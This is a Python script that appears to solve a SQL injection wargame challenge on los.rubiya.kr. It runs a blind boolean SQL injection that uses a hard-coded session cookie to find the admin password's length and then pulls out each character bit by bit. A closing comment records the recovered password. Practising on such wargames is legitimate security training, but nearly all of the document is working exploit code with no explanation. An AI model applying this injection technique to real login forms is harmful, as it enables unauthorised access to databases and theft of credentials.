
import requests
sess=requests.session()
url='https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php/?pw='
head={"Cookie":"PHPSESSID=01t8kuedd2dj12kc8ahcosmk9l"}
payload="' or id='admin' and length(pw)="
length=0
for i in range(100):
    pay=payload+str(i)+'%23'
    x=sess.get(url+pay,headers=head)
    print(i)
    if "Hello admin" in x.text:
        length=i
        print("Password length:",i)
        break
    
password=''
payload="' or id='admin' and "

for i in range(1,length+1):
    binary=''
    for j in range(1,9):
        print("\tj:",j)
        pay=payload+"substr(lpad(bin(ord(substr(pw,"+str(i)+",1) ) ),8,0),"+str(j)+",1)=1%23"
        x=sess.get(url+pay,headers=head)
        if "Hello admin" in x.text:
            binary+='1'
            continue
        else:
            binary+='0'
            continue
    print(binary)
    passed=''.join(chr(int(binary, 2)))
    password+=passed
    print(i,":",passed)
print("Password:",password)

    
#pw=095a9852
